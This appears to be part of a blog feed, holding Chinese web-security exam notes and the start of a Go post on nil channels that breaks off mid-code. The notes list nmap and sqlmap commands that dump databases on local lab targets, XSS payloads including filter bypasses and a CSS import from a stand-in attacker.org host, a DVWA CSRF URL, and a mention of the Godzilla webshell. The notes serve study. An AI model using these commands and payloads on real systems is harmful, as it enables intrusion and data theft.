&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 扫主机&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">nmap 192.168.1.105 192.168.1.106 &lt;span class="c1"># 1个或多个&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">nmap 192.168.1.105-106 &lt;span class="c1"># 和上面一样&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">nmap 192.168.1.0/24 &lt;span class="c1"># 团灭整个网段&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">nmap --li /tmp/file --exclude 192.168.1.105 --excludefile /tmp/file1 &lt;span class="c1"># 扫`file`整个文件, 除了`192.168.1.105`和文件`file1`里头的&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 路由跟踪&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">nmap --traceroute 192.168.1.105
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 扫端口&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">nmap 192.168.0.100 –p 21,22,23,80
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 扫在线状况&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">nmap –sP 192.168.0.100/24
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 操作系统指纹识别&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">nmap –O 192.168.0.105 &lt;span class="c1"># 识别操作系统的版本&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 服务版本检测&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">nmap -sV 192.168.0.105 &lt;span class="c1"># 检测开放端口对应的服务版本信息&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 探测防火墙状态 &lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">nmap -sF -T4 192.168.0.105 &lt;span class="c1"># FIN扫描用于识别端口是否关闭，RST: 端口关闭，否则是open或 filtered状态.&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://resyon.netlify.app/upload/2021/12/image-2b222cb254a2483eac14c1d169a5f093.png"
loading="lazy"
alt="image.png"
>&lt;/p>
&lt;h4 id="sqlmap">sqlmap&lt;/h4>
&lt;blockquote>
&lt;p>&lt;a class="link" href="https://docs.google.com/presentation/d/1RTnsCI0q02FCXouj4AYTvYbsAS-vo97keWnRdWRe-pQ/edit?usp=sharing" target="_blank" rel="noopener"
>ppt&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://resyon.netlify.app/upload/2021/12/image-4b322e227b804a6cbd763c0f357ee550.png"
loading="lazy"
alt="image.png"
>&lt;/p>
&lt;p>使用&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 扫单个url, url都加双引号就对了&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sqlmap.py -u &lt;span class="s2">&amp;#34;http://192.168.1.104/sql1/Less-1/?id=1&amp;amp;uid=2&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 扫文件里的&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sqlmap.py -r desktop/1.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># show databases;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sqlmap.py -u http://127.0.0.1/sql/Less-1/?id&lt;span class="o">=&lt;/span>&lt;span class="m">1&lt;/span> --dbs
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># use security; show tables;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sqlmap.py -u http://127.0.0.1/sql/Less-1?id&lt;span class="o">=&lt;/span>&lt;span class="m">1&lt;/span> -D security --tables
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># desc security.users;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sqlmap.py -u &lt;span class="s2">&amp;#34;http://127.0.0.1/sql/Less-1/?id=1&amp;#34;&lt;/span> -D security -T users --columns
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># select * from security.users; &lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sqlmap.py -u “http://127.0.0.1/sql/Less-1/?id&lt;span class="o">=&lt;/span>1” -D security -T users --dump
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 获取数据库的所有用户&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sqlmap.py -u &lt;span class="s2">&amp;#34;http://127.0.0.1/sql/Less-1/?id=1&amp;#34;&lt;/span> -users
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 获取当前网站数据库的名称&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sqlmap.py -u “http://127.0.0.1/sql/Less-1/?id&lt;span class="o">=&lt;/span>1” --current-db
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 获取当前网站数据库的用户名称&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sqlmap.py -u “http://127.0.0.1/sql/Less-1/?id&lt;span class="o">=&lt;/span>1” --current-user
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="实操">实操&lt;/h2>
&lt;h3 id="sql注入">SQL注入&lt;/h3>
&lt;blockquote>
&lt;p>&lt;a class="link" href="https://docs.google.com/presentation/d/1BoP8zCuAYZvGmVxFBFtKwGdJB29VHF9RfnkThf-WDoM/edit?usp=sharing" target="_blank" rel="noopener"
>ppt&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>SQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。&lt;/p>
&lt;p>SQL注入漏洞的产生需要满足以下两个条件：
1、参数用户可控：前端传给后端的参数内容是用户可以控制的。
2、参数带入数据库查询：传入的参数拼接到SQL语句，且带入数据库查询&lt;/p>
&lt;h4 id="考点">考点&lt;/h4>
&lt;p>虚拟机下完成union boolean 报错注入
&lt;img src="https://resyon.netlify.app/upload/2021/12/image-81e503bcb28b41128b1162536612347e.png"
loading="lazy"
alt="image.png"
>
&lt;img src="https://resyon.netlify.app/upload/2021/12/image-5a6640925c8c4076a3049f7b750a909f.png"
loading="lazy"
alt="image.png"
>&lt;/p>
&lt;h3 id="文件上传">文件上传&lt;/h3>
&lt;blockquote>
&lt;p>&lt;a class="link" href="https://docs.google.com/presentation/d/1XUfC7W_sLhVOxO8n_CksYJIxchn31_TatbjwG_JTHKk/edit?usp=sharing" target="_blank" rel="noopener"
>ppt&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>利用文件上传漏洞将可执行脚本程序上传到服务器中，获得网站的权限，或者进一步危害服务器&lt;/p>
&lt;h4 id="js绕过">js绕过&lt;/h4>
&lt;p>原因：这种情况只是对&lt;code>http head&lt;/code>中的&lt;code>Content-Type&lt;/code>字段进行限制
方案：此时只需要使用&lt;code>burpsuite&lt;/code>啥的把Content-Type改了&lt;/p>
&lt;h4 id="图马绕过">图马绕过&lt;/h4>
&lt;p>原因：服务端对文件进行了检测
方案：&lt;del>他没给，肯定不考&lt;/del>&lt;/p>
&lt;h4 id="考点-1">考点&lt;/h4>
&lt;p>文件上传&amp;ndash;js检测绕过漏洞
文件后缀(改名)
文件类型绕过(burpsuite改Content-Type)&lt;/p>
&lt;h3 id="暴力破解">暴力破解&lt;/h3>
&lt;p>&lt;a class="link" href="https://docs.google.com/presentation/d/1Bs7VGNWOsRhZp1QTU4QG48VBut20a86tOY1KfSuNy2M/edit?usp=sharing" target="_blank" rel="noopener"
>ppt&lt;/a>&lt;/p>
&lt;h3 id="xss">XSS&lt;/h3>
&lt;p>在Web的世界里有各种各样的语言，于是乎对于语句的解析大家各不相同，有一些语句在一种语言里是合法的，但是在另外一种语言里是非法的。这种二义性使得黑客可以用代码注入的方式进行攻击一将恶意代码注入合法代码里隐藏起来，再诱发恶意代码，从而进行各种各样的非法活动。只要破坏跨层协议的数据/指令的构造，我们就能攻击。
XSS的基本实现思路很简单：比如持久型XSS通过一些正常的站内交互途径，例如发布评论，提交含有Javascript的内容文本。这时服务器端如果没有过滤或转义掉这些脚本，作为内容发布到了页面上，其他用户访问这个页面的时候就会运行这些脚本，从而被攻击。&lt;/p>
&lt;h4 id="考点-2">考点&lt;/h4>
&lt;ol>
&lt;li>
&lt;p>XSS反射型/存储型
方法一:用&lt;code>&amp;lt;img&amp;gt;&lt;/code>标签代替&lt;code>&amp;lt;script&amp;gt;&lt;/code>
&lt;code>&amp;lt;img src=1 onerror=alert('xss')&amp;gt;&lt;/code>
方法二:双写绕过&lt;code>&amp;lt;s&amp;lt;script&amp;gt;cript&amp;gt;alert('xss')&amp;lt;/script&amp;gt;&lt;/code>
方法三:大小写绕过
&lt;code>&amp;lt;ScRipt&amp;gt;alert('xss')&amp;lt;/ScRipt&amp;gt;&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>DOM型
&lt;code>?default=&amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt;&lt;/code>&lt;/p>
&lt;/li>
&lt;/ol>
&lt;p>上面不行，试试下面的&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;span class="lnt">36
&lt;/span>&lt;span class="lnt">37
&lt;/span>&lt;span class="lnt">38
&lt;/span>&lt;span class="lnt">39
&lt;/span>&lt;span class="lnt">40
&lt;/span>&lt;span class="lnt">41
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">第一类：Javascript URL
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&amp;lt;a href=&amp;#34;javascript:alert(&amp;#39;test&amp;#39;)&amp;#34;&amp;gt;link&amp;lt;/a&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&amp;lt;a href=&amp;#34;java&amp;amp;#115;cript:alert(&amp;#39;xss&amp;#39;)&amp;#34;&amp;gt;link&amp;lt;/a&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&amp;lt;iframe src=javascript:alert(&amp;#39;xss&amp;#39;)&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">第二类：Inline style
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&amp;lt;div style=&amp;#34;color: expression(alert(&amp;#39;XSS&amp;#39;))&amp;#34;&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&amp;lt;div style=color:expression\(alert(1))&amp;gt;&amp;lt;/div&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">第三类：JavaScript 事件
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&amp;lt;img src=1 onclick=alert(&amp;#39;xss&amp;#39;)&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&amp;lt;img src=1 onerror=alert(&amp;#39;xss&amp;#39;)&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&amp;lt;body onload=alert(&amp;#39;xss&amp;#39;)&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">第四类：Script标签
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&amp;lt;script&amp;gt;alert(&amp;#39;xss&amp;#39;)&amp;lt;/script&amp;gt; &amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&amp;lt;script&amp;gt;window.location=&amp;#39;http://www.163.com&amp;#39;&amp;lt;/script&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&amp;lt;scr&amp;lt;script&amp;gt;ipt&amp;gt;alert(&amp;#39;XSS&amp;#39;)&amp;lt;/scr&amp;lt;script&amp;gt;ipt&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&amp;lt;SCRIPT&amp;gt;alert(&amp;#39;xss&amp;#39;)&amp;lt;/SCRIPT&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">第五类：CSS import
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&amp;lt;style&amp;gt;@import url(&amp;#34;http://attacker.org/malicious.css&amp;#34;);&amp;lt;/style&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&amp;lt;style&amp;gt;@imp\ort url(&amp;#34;http://attacker.org/malicious.css&amp;#34;);&amp;lt;/style&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&amp;lt;STYLE&amp;gt;@im\port&amp;#39;\ja\vasc\ript:alert(&amp;#34;XSS&amp;#34;)&amp;#39;;&amp;lt;/STYLE&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&amp;lt;STYLE&amp;gt;@import&amp;#39;http://jb51.net/xss.css&amp;#39;;&amp;lt;/STYLE&amp;gt;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="csrf--原理">CSRF 原理&lt;/h3>
&lt;p>CSRF( Cross- site request forgery,跨站请求伪造)也被称为 One ClickAttackt或者 Session Riding,通常缩写为CSRF或者XSRF,是一种对网站的恶意利用。尽管听起来像跨站脚本(XSS),但它与XSs非常不同，XSS利用站点内的信任用户而CSRF通过你装成受信任用户请求受信任的网站。与XSS攻击相比CSRF攻击往往不大流行（因此对其进行防范的资源也相当稀少）也难以防范，所以被认为比XSS更具危险性。&lt;/p>
&lt;p>攻击者利用目标用户的身份，以目标用户的名义执行某些非法操作。CSRF能够做的事情包括：以目标用户的名义发送邮件、发消息，盗取目标用户的账号，甚至购买商品、虚拟货币转账，这会泄露个人隐私并威胁到了目标用户的财产安全。&lt;/p>
&lt;h4 id="考点-3">考点&lt;/h4>
&lt;p>虚拟机下CSRF攻击&lt;/p>
&lt;ol>
&lt;li>
&lt;p>简单的话
构建响应的url，
http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=45&amp;amp;password_conf=45&amp;amp;Change=Change#
在本浏览器新建页面后进去构建好的url，页面显示密码修改成功。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>中等的话
&lt;img src="https://resyon.netlify.app/upload/2021/12/image-5176172a38b24276947c3a14945a2a64.png"
loading="lazy"
alt="image.png"
>
&lt;img src="https://resyon.netlify.app/upload/2021/12/image-0deae3d355b0474c809a8a2e5e3dc52c.png"
loading="lazy"
alt="image.png"
>&lt;/p>
&lt;/li>
&lt;/ol>
&lt;h2 id="杂项">杂项&lt;/h2>
&lt;p>哥斯拉木马的使用，远程控制，远程控制机上上传文件生成一个用户&lt;/p>
&lt;p>Php代码理解，分析漏洞&lt;/p>
&lt;ol>
&lt;li>网络安全形式
（通过什么方法防范什么问题达到什么效果）通过采取必要措施，防范对网络的攻击、入侵、干扰、破坏和非法使用以及意外事故，使网络处于可靠运行的状态，以及保障网络的存储，传输，处理信息的完整性，保密性，可用性的能力。
网络安全：网络运行（服务器崩溃）+网络信息安全&lt;/li>
&lt;li>网络安全渗透 攻击 网页篡改 远程攻击
渗透过程（流程图会画）
踩点 提权
检索方式:site inurl&lt;/li>
&lt;li>网络安全 渗透工程师 职业&lt;/li>
&lt;li>开发 大数据&lt;/li>
&lt;li>SQL注入 Union boolean 报错信息
Union 函数 -版本号（目的：漏洞 利用）
Boolean &amp;ndash;(yes/no) 枚举 报错信息&lt;/li>
&lt;li>登录 查询&lt;/li>
&lt;li>SQL语句 标准 常规 异类&lt;/li>
&lt;li>库、表、字段&amp;mdash;&amp;gt; 管理 系统表 &amp;ndash;&amp;gt; 加密存储&lt;/li>
&lt;li>工具
bs&lt;br>
sqlmap
nmap&lt;/li>
&lt;li>bs&amp;mdash;proxy代理（浏览器） 发出请求 响应response 扫描scanner&lt;br>
拦截 篡改 钓鱼 代理
暴力破解（密码字典 原理 工具）&lt;/li>
&lt;li>html静态 交互
部署 php使用&amp;mdash;数据库增删改查IDUS 服务(sqldemo） index.php&lt;/li>
&lt;li>xss
js php
交互 对话框
反射型 存储型 脚本 执行
dom型&lt;/li>
&lt;li>文件上传&lt;/li>
&lt;li>哥斯拉&amp;mdash;做木马 php
绕过 Js
文件类型 绕过
文件后缀 绕过
远程控制&lt;/li>
&lt;li>IP端口 URL &amp;mdash;&amp;gt;网络&lt;/li>
&lt;li>靶机 物理机 （必考）&lt;/li>
&lt;li>test.sql上传数据库 导入数据&lt;/li>
&lt;li>CSRF&lt;/li>
&lt;li>KALI msf ms&lt;/li>
&lt;/ol></description></item><item><title>awesome way to make use of nil channel</title><link>https://resyon.netlify.app/p/awesome-way-to-make-use-of-nil-channel/</link><pubDate>Wed, 08 Dec 2021 20:45:20 +0800</pubDate><guid>https://resyon.netlify.app/p/awesome-way-to-make-use-of-nil-channel/</guid><description>&lt;h1 id="awesome-way-to-make-use-of-nil-channel">Awesome way to make use of &lt;code>nil&lt;/code> channel&lt;/h1>
&lt;h2 id="common">common&lt;/h2>
&lt;p>Send and receive operations on a nil channel block forver. It&amp;rsquo;s a well documented behavior&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">package&lt;/span> &lt;span class="nx">main&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="p">(&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s">&amp;#34;fmt&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kd">func&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">var&lt;/span> &lt;span class="nx">ch&lt;/span> &lt;span class="kd">chan&lt;/span> &lt;span class="kt">int&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">go&lt;/span> &lt;span class="kd">func&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">fmt&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Println&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;ready to read from ch&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">fmt&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;get val: %v\n&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;lt;-&lt;/span>&lt;span class="nx">ch&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}()&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">fmt&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Println&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;ready to write val to ch&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">ch&lt;/span> &lt;span class="o">&amp;lt;-&lt;/span> &lt;span class="mi">17&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>got output
&lt;img src="https://resyon.netlify.app/upload/2021/12/image-91291c0c90e24bb4b012c102129be6cd.png"
loading="lazy"
alt="image.png"
>&lt;/p>
&lt;h2 id="awesome-usage">awesome usage&lt;/h2>
&lt;p>This behavior can be used as a way to dynamically enable and disable case blocks in a select statement.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;span class="lnt">36
&lt;/span>&lt;span class="lnt">37
&lt;/span>&lt;span class="lnt">38
&lt;/span>&lt;span class="lnt">39
&lt;/span>&lt;span class="lnt">40
&lt;/span>&lt;span class="lnt">41
